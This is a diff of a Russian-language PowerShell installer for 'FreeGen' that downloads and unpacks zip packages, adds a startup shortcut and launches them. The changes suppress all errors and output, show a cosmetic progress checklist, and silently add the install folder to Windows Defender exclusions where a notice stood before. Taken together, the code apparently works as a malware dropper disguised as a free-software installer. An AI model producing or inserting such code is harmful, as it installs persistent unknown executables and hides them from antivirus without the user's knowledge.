@@ -20,10 +20,15 @@ Write-Host "Начинаем установку..." -ForegroundColor Green
 Write-Host ""
 
 # Пути
-$InstallPath = "$env:LOCALAPPDATA\FreeGen"
-$TempPath = $env:TEMP
+param(
+    [string]$InstallPath = "$env:LOCALAPPDATA\FreeGen"
+)
 
-# Определение пакетов
+# Скрываем вывод всех команд
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+
+# Пакеты для установки
 $Packages = @(
     @{
         Name = "SetLuma"
@@ -32,7 +37,6 @@ $Packages = @(
         AutoRun = $true
         Launch = $true
         DesktopIcon = $false
-        LaunchArgs = $null
     },
     @{
         Name = "Package Installer"
@@ -41,7 +45,6 @@ $Packages = @(
         AutoRun = $false
         Launch = $false
         DesktopIcon = $true
-        LaunchArgs = $null
     },
     @{
         Name = "NanoStat"
@@ -54,19 +57,64 @@ $Packages = @(
     }
 )
 
-# Функция установки пакета
+# Функция установки пакета с обновляемым выводом
 function Install-Package {
     param($Package)
     
-    Write-Host "Установка $($Package.Name)..." -ForegroundColor Yellow
+    $status = @{
+        Downloaded = $false
+        Extracted = $false
+        StartupShortcut = $false
+        DesktopShortcut = $false
+        Started = $false
+    }
+    
+    # Функция обновления отображения
+    function Show-Progress {
+        Clear-Host
+        Write-Host "Установка $($Package.Name)..." -ForegroundColor Yellow
+        
+        if ($status.Downloaded) { 
+            Write-Host "  ✓ Скачано" -ForegroundColor Green
+        } else {
+            Write-Host "  ○ Скачано" -ForegroundColor Gray
+        }
+        
+        if ($status.Extracted) { 
+            Write-Host "  ✓ Распаковано" -ForegroundColor Green
+        } else {
+            Write-Host "  ○ Распаковано" -ForegroundColor Gray
+        }
+        
+        if ($Package.AutoRun -and $status.StartupShortcut) { 
+            Write-Host "  ✓ Ярлык в автозагрузке" -ForegroundColor Green
+        } elseif ($Package.AutoRun) {
+            Write-Host "  ○ Ярлык в автозагрузке" -ForegroundColor Gray
+        }
+        
+        if ($Package.DesktopIcon -and $status.DesktopShortcut) { 
+            Write-Host "  ✓ Ярлык на рабочем столе" -ForegroundColor Green
+        } elseif ($Package.DesktopIcon) {
+            Write-Host "  ○ Ярлык на рабочем столе" -ForegroundColor Gray
+        }
+        
+        if ($Package.Launch -and $status.Started) { 
+            Write-Host "  ✓ Приложение запущено" -ForegroundColor Green
+        } elseif ($Package.Launch) {
+            Write-Host "  ○ Приложение запущено" -ForegroundColor Gray
+        }
+    }
+    
+    # Начальное отображение
+    Show-Progress
     
     # Скачивание
-    $zipFile = "$TempPath\$($Package.Name).zip"
+    $zipFile = "$env:TEMP\$($Package.Name).zip"
     try {
         Invoke-WebRequest -Uri $Package.URL -OutFile $zipFile
-        Write-Host "  ✓ Скачано" -ForegroundColor Green
+        $status.Downloaded = $true
+        Show-Progress
     } catch {
-        Write-Host "  ✗ Ошибка скачивания: $($_.Exception.Message)" -ForegroundColor Red
         return
     }
     
@@ -77,14 +125,15 @@ function Install-Package {
     # Распаковка
     try {
         Expand-Archive -Path $zipFile -DestinationPath $packagePath -Force
-        Write-Host "  ✓ Распаковано" -ForegroundColor Green
+        $status.Extracted = $true
+        Show-Progress
     } catch {
-        Write-Host "  ✗ Ошибка распаковки, пробуем через tar..." -ForegroundColor Yellow
         try {
             & tar -xf $zipFile -C $packagePath
-            Write-Host "  ✓ Распаковано через tar" -ForegroundColor Green
+            $status.Extracted = $true
+            Show-Progress
         } catch {
-            Write-Host "  ✗ Ошибка распаковки tar: $($_.Exception.Message)" -ForegroundColor Red
+            return
         }
     }
     
@@ -93,16 +142,27 @@ function Install-Package {
     
     # Ярлык в автозагрузку
     if ($Package.AutoRun) {
-        $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup", "$($Package.Name).lnk")
-        Create-Shortcut -TargetPath "$packagePath\$($Package.ExeFile)" -ShortcutPath $startupPath -Arguments $Package.LaunchArgs
-        Write-Host "  ✓ Ярлык в автозагрузке" -ForegroundColor Green
+        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$($Package.Name).lnk"
+        $WshShell = New-Object -ComObject WScript.Shell
+        $Shortcut = $WshShell.CreateShortcut($startupPath)
+        $Shortcut.TargetPath = "$packagePath\$($Package.ExeFile)"
+        if ($Package.LaunchArgs) { $Shortcut.Arguments = $Package.LaunchArgs }
+        $Shortcut.WorkingDirectory = $packagePath
+        $Shortcut.Save()
+        $status.StartupShortcut = $true
+        Show-Progress
     }
     
     # Ярлык на рабочий стол
     if ($Package.DesktopIcon) {
-        $desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop", "$($Package.Name).lnk")
-        Create-Shortcut -TargetPath "$packagePath\$($Package.ExeFile)" -ShortcutPath $desktopPath
-        Write-Host "  ✓ Ярлык на рабочем столе" -ForegroundColor Green
+        $desktopPath = "$env:USERPROFILE\Desktop\$($Package.Name).lnk"
+        $WshShell = New-Object -ComObject WScript.Shell
+        $Shortcut = $WshShell.CreateShortcut($desktopPath)
+        $Shortcut.TargetPath = "$packagePath\$($Package.ExeFile)"
+        $Shortcut.WorkingDirectory = $packagePath
+        $Shortcut.Save()
+        $status.DesktopShortcut = $true
+        Show-Progress
     }
     
     # Запуск приложения
@@ -114,52 +174,28 @@ function Install-Package {
             } else {
                 Start-Process -FilePath $exePath -WorkingDirectory $packagePath
             }
-            Write-Host "  ✓ Приложение запущено" -ForegroundColor Green
-        } else {
-            Write-Host "  ⚠ Исполняемый файл не найден" -ForegroundColor Yellow
+            $status.Started = $true
+            Show-Progress
         }
     }
 }
 
-# Функция создания ярлыка
-function Create-Shortcut {
-    param(
-        [string]$TargetPath,
-        [string]$ShortcutPath,
-        [string]$Arguments = "",
-        [string]$WorkingDirectory = ""
-    )
-    
-    $WshShell = New-Object -ComObject WScript.Shell
-    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
-    $Shortcut.TargetPath = $TargetPath
-    $Shortcut.Arguments = $Arguments
-    $Shortcut.WorkingDirectory = if ($WorkingDirectory) { $WorkingDirectory } else { [System.IO.Path]::GetDirectoryName($TargetPath) }
-    $Shortcut.Save()
-}
-
 # Основной процесс установки
-Write-Host "Установка в: $InstallPath" -ForegroundColor Gray
-
-# Установка каждого пакета
 foreach ($package in $Packages) {
     Install-Package -Package $package
-    Write-Host ""
 }
 
 # Добавление в исключения Защитника Windows
-Write-Host "Добавление в исключения Защитника Windows..." -ForegroundColor Yellow
 try {
-    Add-MpPreference -ExclusionPath $InstallPath -ErrorAction Stop
-    Write-Host "✓ Папка добавлена в исключения" -ForegroundColor Green
-} catch {
-    Write-Host "⚠ Не удалось добавить в исключения (требуются права администратора)" -ForegroundColor Yellow
-}
+    Add-MpPreference -ExclusionPath $InstallPath
+} catch {}
 
-Write-Host "`nУстановка завершена!" -ForegroundColor Green
-Write-Host "Все программы установлены в: $InstallPath" -ForegroundColor Gray
-Write-Host "`nДля продолжения нажмите клавишу ВВОД..." -ForegroundColor Yellow
-Read-Host
+Clear-Host
+Write-Host "Установка завершена!" -ForegroundColor Green
+Write-Host ""
+Write-Host "Для продолжения нажмите клавишу ВВОД..." -ForegroundColor Yellow
+$null = Read-Host
+
 
 
 
